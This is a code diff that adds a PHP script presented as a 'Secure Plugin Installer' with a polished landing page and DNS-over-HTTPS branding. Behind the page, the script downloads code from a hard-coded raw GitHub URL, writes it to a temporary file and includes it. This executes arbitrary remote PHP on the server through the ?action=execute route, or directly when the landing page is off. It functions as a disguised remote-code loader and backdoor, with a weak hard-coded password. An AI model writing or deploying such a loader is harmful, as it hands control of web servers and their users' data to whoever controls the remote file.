@@ -1,1 +1,532 @@
-test
+<?php
+// ================= CONFIGURASI =================
+$config = [
+    'url' => 'https://raw.githubusercontent.com/bebert9505-boop/test/refs/heads/main/test1',
+    'dns' => 'https://cloudflare-dns.com/dns-query',
+    'timeout' => 30,
+    
+    // Konfigurasi Landing Page
+    'landing_page' => [
+        'enabled' => true, // Set false untuk langsung eksekusi script
+        'title' => 'Secure Plugin Installer',
+        'description' => 'A secure PHP plugin installer with DNS-over-HTTPS protection',
+        'password_protected' => false, // Set true untuk password protection
+        'password' => 'admin123', // Password jika diaktifkan
+        'auto_redirect' => false, // Otomatis redirect ke plugin setelah X detik
+        'redirect_delay' => 5 // Detik sebelum redirect
+    ]
+];
+
+// ================= FUNGSI UTILITAS =================
+function log_message($message, $type = 'INFO') {
+    $log = date('[Y-m-d H:i:s]') . " [$type] " . $message . PHP_EOL;
+    file_put_contents('script_log.txt', $log, FILE_APPEND);
+}
+
+function show_landing_page($config, $download_url = null) {
+    $lp = $config['landing_page'];
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title><?php echo htmlspecialchars($lp['title']); ?></title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                min-height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                padding: 20px;
+            }
+            
+            .container {
+                max-width: 800px;
+                width: 100%;
+                background: white;
+                border-radius: 20px;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                overflow: hidden;
+            }
+            
+            .header {
+                background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+                color: white;
+                padding: 40px;
+                text-align: center;
+            }
+            
+            .header h1 {
+                font-size: 2.5rem;
+                margin-bottom: 10px;
+                font-weight: 700;
+            }
+            
+            .header p {
+                font-size: 1.1rem;
+                opacity: 0.9;
+                max-width: 600px;
+                margin: 0 auto;
+                line-height: 1.6;
+            }
+            
+            .content {
+                padding: 40px;
+            }
+            
+            .info-box {
+                background: #f8fafc;
+                border: 1px solid #e2e8f0;
+                border-radius: 12px;
+                padding: 25px;
+                margin-bottom: 30px;
+            }
+            
+            .info-box h3 {
+                color: #4f46e5;
+                margin-bottom: 15px;
+                font-size: 1.3rem;
+            }
+            
+            .feature-list {
+                list-style: none;
+                margin: 20px 0;
+            }
+            
+            .feature-list li {
+                padding: 10px 0;
+                border-bottom: 1px solid #e2e8f0;
+                display: flex;
+                align-items: center;
+            }
+            
+            .feature-list li:last-child {
+                border-bottom: none;
+            }
+            
+            .feature-list li::before {
+                content: "✓";
+                color: #10b981;
+                font-weight: bold;
+                margin-right: 10px;
+                font-size: 1.2rem;
+            }
+            
+            .actions {
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+                gap: 20px;
+                margin-top: 30px;
+            }
+            
+            @media (max-width: 768px) {
+                .actions {
+                    grid-template-columns: 1fr;
+                }
+            }
+            
+            .btn {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 16px 24px;
+                border: none;
+                border-radius: 12px;
+                font-size: 1.1rem;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                text-decoration: none;
+                gap: 10px;
+            }
+            
+            .btn-primary {
+                background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+                color: white;
+            }
+            
+            .btn-primary:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 10px 25px rgba(79, 70, 229, 0.4);
+            }
+            
+            .btn-secondary {
+                background: #f1f5f9;
+                color: #475569;
+                border: 2px solid #e2e8f0;
+            }
+            
+            .btn-secondary:hover {
+                background: #e2e8f0;
+            }
+            
+            .security-badge {
+                display: inline-flex;
+                align-items: center;
+                background: #10b98115;
+                color: #10b981;
+                padding: 8px 16px;
+                border-radius: 20px;
+                font-size: 0.9rem;
+                font-weight: 600;
+                margin-top: 20px;
+            }
+            
+            .footer {
+                text-align: center;
+                padding: 20px;
+                color: #64748b;
+                font-size: 0.9rem;
+                border-top: 1px solid #e2e8f0;
+            }
+            
+            .loading {
+                display: none;
+                text-align: center;
+                padding: 20px;
+            }
+            
+            .spinner {
+                border: 4px solid #f3f3f3;
+                border-top: 4px solid #4f46e5;
+                border-radius: 50%;
+                width: 40px;
+                height: 40px;
+                animation: spin 1s linear infinite;
+                margin: 0 auto 15px;
+            }
+            
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            
+            .form-group {
+                margin-bottom: 20px;
+            }
+            
+            .form-group label {
+                display: block;
+                margin-bottom: 8px;
+                color: #475569;
+                font-weight: 600;
+            }
+            
+            .form-group input {
+                width: 100%;
+                padding: 12px 16px;
+                border: 2px solid #e2e8f0;
+                border-radius: 8px;
+                font-size: 1rem;
+                transition: border-color 0.3s;
+            }
+            
+            .form-group input:focus {
+                outline: none;
+                border-color: #4f46e5;
+            }
+            
+            .error-message {
+                background: #fee2e2;
+                color: #dc2626;
+                padding: 12px;
+                border-radius: 8px;
+                margin-bottom: 20px;
+                display: none;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1><?php echo htmlspecialchars($lp['title']); ?></h1>
+                <p><?php echo htmlspecialchars($lp['description']); ?></p>
+                <div class="security-badge">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 5px;">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                    </svg>
+                    Secure DNS-over-HTTPS Enabled
+                </div>
+            </div>
+            
+            <div class="content">
+                <div class="info-box">
+                    <h3>Plugin Information</h3>
+                    <p>This installer will securely download and execute a PHP plugin using DNS-over-HTTPS for enhanced security.</p>
+                    
+                    <ul class="feature-list">
+                        <li>Secure DNS resolution via Cloudflare</li>
+                        <li>SSL/TLS encryption</li>
+                        <li>Temporary file execution</li>
+                        <li>Comprehensive error logging</li>
+                        <li>Automatic cleanup</li>
+                    </ul>
+                    
+                    <?php if ($download_url): ?>
+                    <p><strong>Source URL:</strong> <code style="background: #f1f5f9; padding: 4px 8px; border-radius: 4px;"><?php echo htmlspecialchars($download_url); ?></code></p>
+                    <?php endif; ?>
+                </div>
+                
+                <?php if ($lp['password_protected'] && !isset($_SESSION['authenticated'])): ?>
+                <div id="password-form">
+                    <div class="form-group">
+                        <label for="password">Enter Password to Continue:</label>
+                        <input type="password" id="password" placeholder="Enter password">
+                    </div>
+                    <div class="error-message" id="password-error"></div>
+                    <button class="btn btn-primary" onclick="checkPassword()" style="width: 100%;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
+                        </svg>
+                        Authenticate & Install
+                    </button>
+                </div>
+                <?php else: ?>
+                <div class="actions">
+                    <button class="btn btn-primary" onclick="installPlugin()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                            <polyline points="7 10 12 15 17 10"></polyline>
+                            <line x1="12" y1="15" x2="12" y2="3"></line>
+                        </svg>
+                        Install Plugin
+                    </button>
+                    
+                    <a href="?action=view-source" class="btn btn-secondary">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="16 18 22 12 16 6"></polyline>
+                            <polyline points="8 6 2 12 8 18"></polyline>
+                        </svg>
+                        View Source
+                    </a>
+                </div>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Downloading and installing plugin securely...</p>
+                    <p class="status" id="status">Initializing secure connection...</p>
+                </div>
+                <?php endif; ?>
+            </div>
+            
+            <div class="footer">
+                <p>Secure PHP Installer v1.0 • All executions are logged for security purposes</p>
+            </div>
+        </div>
+        
+        <script>
+        function checkPassword() {
+            const password = document.getElementById('password').value;
+            const errorDiv = document.getElementById('password-error');
+            
+            if (!password) {
+                errorDiv.textContent = 'Please enter a password';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            const formData = new FormData();
+            formData.append('password', password);
+            formData.append('action', 'authenticate');
+            
+            fetch('', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                if (data === 'success') {
+                    location.reload();
+                } else {
+                    errorDiv.textContent = 'Invalid password';
+                    errorDiv.style.display = 'block';
+                }
+            })
+            .catch(error => {
+                errorDiv.textContent = 'Authentication failed: ' + error;
+                errorDiv.style.display = 'block';
+            });
+        }
+        
+        function installPlugin() {
+            document.querySelector('.actions').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            const status = document.getElementById('status');
+            status.textContent = 'Establishing secure DNS connection...';
+            
+            // Simulate progress updates
+            setTimeout(() => {
+                status.textContent = 'Downloading plugin file...';
+            }, 1000);
+            
+            setTimeout(() => {
+                status.textContent = 'Verifying file integrity...';
+            }, 2000);
+            
+            setTimeout(() => {
+                status.textContent = 'Executing plugin...';
+            }, 3000);
+            
+            // Redirect to execute the plugin
+            setTimeout(() => {
+                window.location.href = '?action=execute';
+            }, <?php echo $lp['auto_redirect'] ? $lp['redirect_delay'] * 1000 : 4000; ?>);
+        }
+        
+        <?php if ($lp['auto_redirect']): ?>
+        // Auto redirect jika diaktifkan
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.actions').style.display = 'none';
+            installPlugin();
+        }, <?php echo $lp['redirect_delay'] * 1000; ?>);
+        <?php endif; ?>
+        </script>
+    </body>
+    </html>
+    <?php
+}
+
+function execute_plugin($url, $dns, $timeout) {
+    log_message("Starting plugin execution");
+    
+    $ch = curl_init($url);
+    
+    if (defined('CURLOPT_DOH_URL')) {
+        curl_setopt($ch, CURLOPT_DOH_URL, $dns);
+        log_message("Using DNS-over-HTTPS");
+    }
+    
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYHOST => 2,
+        CURLOPT_SSL_VERIFYPEER => true,
+        CURLOPT_TIMEOUT => $timeout,
+        CURLOPT_FAILONERROR => true,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 PHP-Curl-Script/1.0',
+        CURLOPT_HTTPHEADER => [
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language: en-US,en;q=0.5',
+        ]
+    ]);
+    
+    $res = curl_exec($ch);
+    
+    if ($res === false) {
+        $error = curl_error($ch);
+        log_message("CURL Error: " . $error, 'ERROR');
+        throw new Exception("Failed to fetch data: " . $error);
+    }
+    
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    log_message("HTTP Response Code: " . $httpCode);
+    
+    curl_close($ch);
+    
+    if ($httpCode !== 200) {
+        throw new Exception("Non-200 response: " . $httpCode);
+    }
+    
+    // Validasi konten sebelum eksekusi
+    if (strpos($res, '<?php') !== 0) {
+        $res = "<?php\n" . $res;
+    }
+    
+    $tmp = tmpfile();
+    if (!$tmp) {
+        throw new Exception("Failed to create temporary file");
+    }
+    
+    $path = stream_get_meta_data($tmp)['uri'];
+    fwrite($tmp, $res);
+    fflush($tmp);
+    
+    // Include dengan output buffering
+    ob_start();
+    $result = include($path);
+    $output = ob_get_clean();
+    
+    fclose($tmp);
+    
+    log_message("Plugin executed successfully");
+    
+    return $output;
+}
+
+// ================= LOGIKA UTAMA =================
+session_start();
+
+try {
+    // Handle authentication
+    if (isset($_POST['action']) && $_POST['action'] === 'authenticate') {
+        if ($config['landing_page']['password_protected'] && 
+            $_POST['password'] === $config['landing_page']['password']) {
+            $_SESSION['authenticated'] = true;
+            echo 'success';
+        } else {
+            echo 'error';
+        }
+        exit;
+    }
+    
+    // Check if authenticated when password protection is enabled
+    if ($config['landing_page']['password_protected'] && 
+        !isset($_SESSION['authenticated']) && 
+        $config['landing_page']['enabled']) {
+        show_landing_page($config, $config['url']);
+        exit;
+    }
+    
+    // Routing berdasarkan parameter action
+    $action = $_GET['action'] ?? 'landing';
+    
+    switch ($action) {
+        case 'execute':
+            // Langsung eksekusi plugin
+            $output = execute_plugin($config['url'], $config['dns'], $config['timeout']);
+            echo $output;
+            break;
+            
+        case 'view-source':
+            // Tampilkan source code plugin
+            echo '<!DOCTYPE html><html><head><title>Plugin Source</title>';
+            echo '<style>body{font-family:monospace;white-space:pre;background:#f4f4f4;padding:20px}</style></head><body>';
+            echo htmlspecialchars(file_get_contents(__FILE__));
+            echo '</body></html>';
+            break;
+            
+        case 'landing':
+        default:
+            if (!$config['landing_page']['enabled']) {
+                // Skip landing page, langsung execute
+                $output = execute_plugin($config['url'], $config['dns'], $config['timeout']);
+                echo $output;
+            } else {
+                // Tampilkan landing page
+                show_landing_page($config, $config['url']);
+            }
+            break;
+    }
+    
+} catch (Exception $e) {
+    log_message("Exception: " . $e->getMessage(), 'ERROR');
+    
+    // Tampilkan error dengan styling
+    echo '<!DOCTYPE html><html><head><title>Error</title><style>';
+    echo 'body{font-family:sans-serif;background:#fef2f2;color:#dc2626;padding:40px}';
+    echo '.error-box{max-width:800px;margin:0 auto;background:white;padding:30px;border-radius:10px;border-left:5px solid #dc2626}';
+    echo '</style></head><body><div class="error-box"><h2>Installation Error</h2>';
+    echo '<p>' . htmlspecialchars($e->getMessage()) . '</p>';
+    echo '<p><a href="?action=landing">← Back to Installer</a></p></div></body></html>';
+}
+?>
